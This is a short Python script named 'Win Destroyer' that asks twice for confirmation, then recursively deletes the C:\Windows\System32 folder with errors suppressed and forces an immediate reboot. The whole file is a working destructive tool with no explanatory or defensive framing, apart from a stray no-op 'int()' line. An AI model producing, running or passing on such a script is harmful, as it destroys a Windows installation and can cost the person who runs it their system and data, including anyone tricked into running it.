import shutil
import os
import time

import ctypes


ctypes.windll.kernel32.SetConsoleTitleW("Win Destroyer")

int()




time.sleep(1)

start = input("Are you sure you want to proceed? (this will destroy your system!) [yes / no] ")

while True:
    if start.lower() == 'no':
        print("OK, cancelling operation.")
        time.sleep(1)
        break
    elif start.lower() == 'yes':
        confirm = input("Please confirm you want to proceed [yes / no] ")

        while True:
            if confirm.lower() == 'no':
                print("OK, cancelling operation.")
                time.sleep(1)
                break
            elif confirm.lower() == 'yes':
                print("Removing System32...")
                shutil.rmtree("C:\Windows\System32\\", ignore_errors=True)
                print("Done! Restarting PC...")
                os.system("shutdown /r /t 1")
                break
            else:
                confirm = input("Invalid answer. Please try again [yes / no] ")
        break
    else:
        start = input("Invalid answer. Please try again [yes / no] ")
